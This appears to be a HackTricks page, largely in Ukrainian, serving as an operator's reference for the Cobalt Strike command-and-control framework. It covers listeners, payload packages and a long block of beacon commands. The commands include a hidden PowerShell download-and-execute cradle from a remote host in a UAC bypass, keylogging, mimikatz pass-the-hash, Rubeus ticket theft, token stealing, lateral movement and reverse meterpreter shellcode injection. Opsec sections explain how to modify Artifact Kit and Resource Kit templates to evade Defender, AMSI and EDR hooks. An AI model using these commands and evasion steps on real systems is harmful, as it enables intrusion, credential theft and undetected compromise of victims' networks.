# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` далі можна вибрати, де прослуховувати з'єднання, який тип beacon використовувати (http, dns, smb...) та інші параметри.

### Peer2Peer Listeners

Beacon-и цих listeners не повинні напряму взаємодіяти з C2: вони можуть підключатися до нього через інші beacon-и.

`Cobalt Strike -> Listeners -> Add/Edit` далі потрібно вибрати TCP або SMB beacon-и.

* **TCP beacon встановить listener на вибраному порту**. Щоб підключитися до TCP beacon, використайте команду `connect <ip> <port>` з іншого beacon-а.
* **SMB beacon прослуховуватиме pipename із вибраною назвою**. Щоб підключитися до SMB beacon, потрібно використати команду `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** для HTA-файлів
* **`MS Office Macro`** для office-документа з macro
* **`Windows Executable`** для .exe, .dll або service .exe
* **`Windows Executable (S)`** для **stageless** .exe, .dll або service .exe (stageless краще за staged, оскільки має менше IoC)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` згенерує script/executable для завантаження beacon-а з Cobalt Strike у таких форматах: bitsadmin, exe, powershell і python.

#### Host Payloads

Якщо файл, який потрібно розмістити, уже є, просто перейдіть до `Attacks -> Web Drive-by -> Host File`, виберіть файл для розміщення та конфігурацію web server-а.

### Beacon Options

<details>
<summary>Параметри та команди Beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Custom agent має лише підтримувати HTTP/S protocol Team Server Cobalt Strike (default malleable C2 profile), щоб реєструватися/виконувати check-in і отримувати завдання. Реалізуйте ті самі URIs/headers/metadata crypto, визначені в profile, щоб повторно використовувати Cobalt Strike UI для tasking і виведення результатів.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (наприклад, `CustomBeacon.cna`) може обгорнути генерацію payload для non-Windows beacon, щоб operators могли вибрати listener і безпосередньо створювати ELF payloads із GUI.
- Приклади Linux task handlers, доступних Team Server: `sleep`, `cd`, `pwd`, `shell` (виконання довільних команд), `ls`, `upload`, `download` і `exit`. Вони відповідають task IDs, очікуваним Team Server, і мають бути реалізовані на server-side, щоб повертати output у належному форматі.
- BOF support у Linux можна додати, завантажуючи Beacon Object Files in-process за допомогою [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (також підтримує BOFs у стилі Outflank), що дає змогу запускати modular post-exploitation у context/privileges implant без створення нових processes.<sup>[[2]](#references)[[3]](#references)</sup>
- Вбудуйте SOCKS handler у custom beacon, щоб зберегти parity pivoting із Windows Beacons: коли operator виконує `socks <port>`, implant має відкрити local proxy для маршрутизації operator tooling через compromised Linux host до internal networks.

## Opsec

### Execute-Assembly

**`execute-assembly`** використовує **sacrificial process** із remote process injection для виконання вказаної програми. Це дуже шумно, оскільки для injection у process використовуються певні Win APIs, які перевіряє кожен EDR. Однак існують custom tools, які можна використовувати для завантаження чогось у той самий process:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- У Cobalt Strike також можна використовувати BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Agressor script `https://github.com/outflanknl/HelpColor` створить у Cobalt Strike команду `helpx`, яка додаватиме кольори до commands, позначаючи, чи є вони BOFs (green), Frok&Run (yellow) тощо, або ProcessExecution, injection тощо (red). Це допомагає визначити, які commands є більш stealthy.

### Act as the user

Можна перевірити events на кшталт `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 — перевірте всі interactive logons, щоб визначити звичайні години роботи.
- System EID 12,13 — перевірте частоту shutdown/startup/sleep.
- Security EID 4624/4625 — перевірте inbound valid/invalid NTLM attempts.
- Security EID 4648 — цей event створюється, коли для logon використовуються plaintext credentials. Якщо його згенерував process, binary потенційно містить credentials у clear text у config file або всередині code.

Під час використання `jump` із Cobalt Strike краще використовувати метод `wmi_msbuild`, щоб новий process виглядав більш legitimate.

### Use computer accounts

Захисники часто перевіряють дивну поведінку, створену users, і **виключають service accounts та computer accounts, як-от `*$`, зі свого monitoring**. Можна використовувати ці accounts для lateral movement або privilege escalation.

### Use stageless payloads

Stageless payloads менш шумні, ніж staged, оскільки їм не потрібно завантажувати second stage із C2 server. Це означає, що після initial connection вони не генерують network traffic, тому їх із меншою ймовірністю виявлять network-based defenses.

### Tokens & Token Store

Будьте обережні під час крадіжки або генерації tokens, оскільки EDR може enumerate всі tokens усіх threads і знайти **token, що належить іншому user** або навіть SYSTEM у process.

Це дає змогу зберігати tokens **per beacon**, тому не потрібно знову й знову красти той самий token. Це корисно для lateral movement або коли потрібно використовувати stolen token кілька разів:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Під час lateral movement зазвичай краще **вкрасти token, ніж генерувати новий** або виконувати pass the hash attack.

### Guardrails

Cobalt Strike має feature під назвою **Guardrails**, яка допомагає запобігати використанню певних commands або actions, що можуть бути виявлені defenders. Guardrails можна налаштувати для блокування конкретних commands, як-от `make_token`, `jump`, `remote-exec` та інших, які часто використовуються для lateral movement або privilege escalation.

Крім того, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) також містить деякі checks та ideas, які можна врахувати перед виконанням payload.

### Tickets encryption

В AD будьте обережні з encryption tickets. За замовчуванням деякі tools використовують RC4 encryption для Kerberos tickets, що менш безпечно, ніж AES encryption, а в актуальних environments за замовчуванням використовується AES. Це можуть виявити defenders, які monitoring слабкі encryption algorithms.

### Avoid Defaults

Під час використання Cobalt Stricke за замовчуванням SMB pipes матимуть names `msagent_####` і `"status_####"`. Змініть ці names. Імена наявних pipes у Cobal Strike можна перевірити командою: `ls \\.\pipe\`

Крім того, під час SSH sessions створюється pipe `\\.\pipe\postex_ssh_####`. Змініть його за допомогою `set ssh_pipename "<new_name>";`.

Також під час poext exploitation attack pipes `\\.\pipe\postex_####` можна змінити за допомогою `set pipename "<new_name>"`.

У Cobalt Strike profiles також можна змінювати такі параметри:

- Уникнення використання `rwx`
- Принцип роботи process injection (які APIs використовуватимуться) у блоці `process-inject {...}`
- Принцип роботи "fork and run" у блоці `post-ex {…}`
- Sleep time
- Максимальний size binaries, що завантажуються в memory
- Memory footprint і DLL content за допомогою блоку `stage {...}`
- Network traffic

### Bypass memory scanning

Деякі ERDs сканують memory на наявність відомих malware signatures. Coblat Strike дає змогу змінити функцію `sleep_mask` як BOF, що зможе encrypt backdoor у memory.

### Noisy proc injections

Під час injection code у process це зазвичай дуже шумно, оскільки **звичайний process зазвичай не виконує таку action, а способи її виконання дуже обмежені**. Тому це може виявлятися behaviour-based detection systems. Крім того, це можуть виявляти EDRs, які сканують memory на наявність **threads із code, якого немає на disk** (хоча processes, як-от browsers, що використовують JIT, часто роблять це). Приклад: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Під час spawning нового process важливо **підтримувати звичайний parent-child** relationship між processes, щоб уникнути detection. Якщо svchost.exec запускає iexplorer.exe, це виглядатиме підозріло, оскільки svchost.exe не є parent для iexplorer.exe у звичайному Windows environment.

Коли в Cobalt Strike за замовчуванням spawning новий beacon, створюється process із використанням **`rundll32.exe`**, щоб запустити новий listener. Це не дуже stealthy і може бути легко виявлено EDRs. Крім того, `rundll32.exe` запускається без args, що робить його ще підозрілішим.

За допомогою наведеної нижче Cobalt Strike command можна вказати інший process для spawning нового beacon, зробивши його менш помітним:
```bash
spawnto x86 svchost.exe
```
Ви також можете змінити це налаштування **`spawnto_x86` та `spawnto_x64`** у profile.

### Проксіювання traffic атакувальника

Атакувальникам іноді потрібно мати можливість запускати tools локально, навіть на Linux machines, і спрямовувати traffic victims до tool (наприклад, NTLM relay).

Крім того, іноді для виконання атаки pass-the.hash або pass-the-ticket stealthier для атакувальника **додати цей hash або ticket у власний процес LSASS** локально, а потім виконати pivot через нього замість модифікації процесу LSASS на машині victim.

Однак потрібно бути **обережними зі згенерованим traffic**, оскільки ви можете надсилати uncommon traffic (kerberos?) зі свого backdoor process. Для цього можна виконати pivot до browser process (хоча вас можуть виявити під час ін'єкції у process, тому подбайте про stealth спосіб зробити це).


### Уникнення AVs

#### AV/AMSI/ETW Bypass

Перегляньте сторінку:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Зазвичай у `/opt/cobaltstrike/artifact-kit` можна знайти code і попередньо скомпільовані templates (у `/src-common`) payloads, які cobalt strike використовує для генерації binary beacons.

За допомогою [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) зі згенерованим backdoor (або лише зі скомпільованим template) можна визначити, що саме змушує defender спрацьовувати. Зазвичай це string. Тому можна просто змінити code, який генерує backdoor, щоб цей string не з'являвся у фінальному binary.

Після зміни code просто запустіть `./build.sh` з тієї самої directory і скопіюйте folder `dist-pipe/` у Windows client за шляхом `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Не забудьте завантажити aggressive script `dist-pipe\artifact.cna`, щоб вказати Cobalt Strike використовувати потрібні нам ресурси з диска, а не завантажені.

#### Resource Kit

Папка ResourceKit містить шаблони для script-based payloads Cobalt Strike, зокрема PowerShell, VBA та HTA.

Використовуючи [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) із цими шаблонами, можна визначити, що саме не подобається defender (у цьому випадку AMSI), і змінити це:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Змінюючи виявлені рядки, можна згенерувати шаблон, який не буде виявлено.

Не забудьте завантажити aggressive script `ResourceKit\resources.cna`, щоб вказати Cobalt Strike використовувати потрібні нам resources з диска, а не завантажені.

#### Function hooks | Syscall

Function hooking є дуже поширеним методом ERDs для виявлення malicious activity. Cobalt Strike дозволяє обходити ці hooks, використовуючи **syscalls** замість стандартних викликів Windows API за допомогою конфігурації **`None`**, використовувати версію функції `Nt*` з налаштуванням **`Direct`** або просто перестрибувати через функцію `Nt*` за допомогою опції **`Indirect`** у malleable profile. Залежно від системи, один option може бути stealthier за інший.

Це можна налаштувати у profile або за допомогою команди **`syscall-method`**.

Однак це також може бути noisy.

Одним із варіантів, які Cobalt Strike надає для обходу function hooks, є їхнє видалення за допомогою: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Також можна перевірити, які функції hooked, за допомогою [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) або [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Різні команди Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Посилання

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Аналіз Unit42 шифрування metadata Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Щоденник SANS ISC про трафік Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
